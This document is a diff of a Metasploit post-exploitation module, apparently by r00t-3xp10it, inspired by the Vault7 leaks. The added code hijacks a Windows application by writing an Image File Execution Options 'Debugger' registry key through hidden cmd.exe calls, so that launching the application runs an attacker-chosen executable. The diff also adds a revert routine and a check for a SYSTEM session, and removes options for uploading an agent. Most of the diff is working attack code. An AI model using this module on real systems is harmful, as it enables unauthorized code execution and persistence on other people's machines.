@@ -6,10 +6,9 @@
 ##
 
 
-
 ##
 # Vault7_cia_debugger_hijack.rb
-# $Id$ 1.0 Author: r00t-3xp10it | SSA RedTeam @2017
+# $Id$ 1.1 Author: r00t-3xp10it | SSA RedTeam @2017
 # Credits: https://wikileaks.org/ciav7p1/cms/page_2621770.html
 #
 #
@@ -22,11 +21,8 @@
 #
 # [ POST MODULE OPTIONS ]
 # The session number to run this module on   => set SESSION 1
-# Upload your agent to be executed?          => set UPLOAD_AGENT true
 # Application to be hijacked                 => set HIJACK notepad.exe
-# Binary to be executed                      => set EXEC %temp%\\agent.exe
-# Full path of agent to deploy               => set LOCAL_PATH /root/agent.exe
-# Full path in remote machine                => set REMOTE_PATH %temp%\\agent.exe
+# Binary to be executed (full path)          => set EXEC C:\\Windows\\System32\\calc.exe
 # Delete registry hijack keys                => set REVERT_HIJACK true
 #
 #
@@ -81,7 +77,7 @@ class MetasploitModule < Msf::Post
 # -----------------------------------------
         def initialize(info={})
                 super(update_info(info,
-                        'Name'          => 'Vault7_cia_debugger_hijack (reg hijack execution)',
+                        'Name'          => 'Vault7_cia_debugger_hijack (reg hijack RCE)',
                         'Description'   => %q{
 
                                         This registry key can be used to redirect the execution of any application to a different executable. The specified “debugger” application will be called with a path to the original program as the first argument.
@@ -90,22 +86,22 @@ class MetasploitModule < Msf::Post
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
                                 [
-                                        'peterubuntu10[at]sourceforge[dot]net',      # post-module author
-                                        'Inspiration: Chaitanya [ SSA RedTeam ]',    # module inspiration
-                                        'Special thanks: Vault7 CIA Hacking Tools'   # CIA wikileaks public leak
+                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
+                                        'Inspiration: Chaitanya [ SSA RedTeam ]',     # module inspiration
+                                        'Special thanks: Vault7 CIA Hacking Tools'    # CIA wikileaks public leak
                                 ],
  
-                        'Version'        => '$Revision: 1.0',
-                        'DisclosureDate' => 'mar 8 2017',
+                        'Version'        => '$Revision: 1.1',
+                        'DisclosureDate' => 'abr 19 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'true', # we need a priviliged session to hijack keys :(
                         'Targets'        =>
                                 [
-                                         # Tested againts Windows 10 | windows 7 (SP1) | windows XP (SP3)
+                                         # Tested againts windows 7 (SP1)
                                          [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                 ],
-                        'DefaultTarget'  => '6', # default its to run againts Windows 10
+                        'DefaultTarget'  => '3', # default its to run againts Windows 7
                         'References'     =>
                                 [
                                          [ 'URL', 'https://github.com/r00t-3xp10it' ],
@@ -130,10 +126,7 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
-                                OptBool.new('UPLOAD_AGENT', [ false, 'Upload your agent to be executed?' , false]),
-                                OptString.new('LOCAL_PATH', [ false, 'Full path of agent to deploy (eg. /root/agent.exe)']),
-                                OptString.new('REMOTE_PATH', [ false, 'Full path in remote machine (eg. %temp%\\agent.exe)']),
-                                OptBool.new('REVERT_HIJACK', [ false, 'Delete registry hijack keys (delete EXEC regkey)' , false])
+                                OptBool.new('REVERT_HIJACK', [ false, 'Delete registry hijack keys' , false])
                         ], self.class)
  
         end
@@ -142,7 +135,89 @@ class MetasploitModule < Msf::Post
 
 
 
+#
+# Hijack legit process to gain code execution
+#
+def hijack_funtion
 
+  r=''
+  session = client
+  executable = datastore['EXEC']
+  exec_hijack = datastore['HIJACK']
+  regi_make = "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{exec_hijack}"
+  ireg_key = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
+  if datastore['EXEC_PATH'] == 'nil'
+    print_error(" Options not configurated correctly ..")
+    print_warning(" Please set EXEC | HIJACK options!")
+    return nil
+  else
+    print_status("Hijacking #{exec_hijack} process!")
+    Rex::sleep(1.5)
+  end
+
+    # Start writing registry keys ..
+    print_warning(" Reading process registry hive keys ..")
+    Rex::sleep(1.0)
+    if registry_enumkeys("#{ireg_key}")
+      print_good(" exec => remote registry hive key found ..")
+      Rex::sleep(1.0)
+      print_good(" exec => Placing New Registry Key ..")
+      r = session.sys.process.execute("cmd.exe /c \"#{regi_make}\" /v Debugger /t REG_SZ /d \"#{executable}\" /f", nil, {'Hidden' => true, 'Channelized' => true})
+      Rex::sleep(2.0)
+      r = session.sys.process.execute("cmd.exe /c start \"#{executable}\"", nil, {'Hidden' => true, 'Channelized' => true})
+      r.channel.close
+      r.close
+    else
+      # registry hive key not found, aborting module execution.
+      print_error("[ABORT]: module cant find the registry hive key needed...")
+      print_line("")
+      Rex::sleep(1.0)
+      return nil
+    end
+end    
+
+
+
+
+#
+# Revert process hijack in target regedit
+#
+def revert_hijack
+
+  r=''
+  session = client
+  executable = datastore['EXEC']
+  exec_hijack = datastore['HIJACK']
+  regi_make = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{exec_hijack}"
+  if datastore['EXEC_PATH'] == 'nil'
+    print_error(" Options not configurated correctly ..")
+    print_warning(" Please set EXEC | HIJACK options!")
+    return nil
+  else
+    print_status("Revert #{exec_hijack} Hijack!")
+    Rex::sleep(1.5)
+  end
+
+    # Start writing registry keys ..
+    print_warning(" Reading process registry hive keys ..")
+    Rex::sleep(1.0)
+    if registry_enumkeys("#{regi_make}")
+      print_good(" exec => remote registry hive key found ..")
+      Rex::sleep(1.0)
+      print_good(" exec => Deleting Registry Keys ..")
+      r = session.sys.process.execute("cmd.exe /c \"REG DELETE #{regi_make}\" /f", nil, {'Hidden' => true, 'Channelized' => true})
+      Rex::sleep(2.0)
+      print_status("Registry Keys deleted successefully ..")
+      r.channel.close
+      r.close
+    else
+      # registry hive key not found, aborting module execution.
+      print_error("[ABORT]: module cant find the registry hive key needed...")
+      print_line("")
+      Rex::sleep(1.0)
+      return nil
+    end
+end
 
 
 
@@ -184,6 +259,14 @@ def run
     # check for proper operative system (windows-not-wine)
     if not oscheck == "Windows_NT"
       print_error("[ ABORT ]: This module only works againts windows systems")
+      return nil
+    end
+    #
+    # check if we are running againts a priviliged session
+    #
+    if not runtor == "NT AUTHORITY/SYSTEM"
+      print_error("[ ABORT ]: This module requires a priviliged session ..")
+      print_warning("This module requires NT AUTHORITY/SYSTEM privs to run")
       return nil
     end
     # check for proper session (meterpreter)
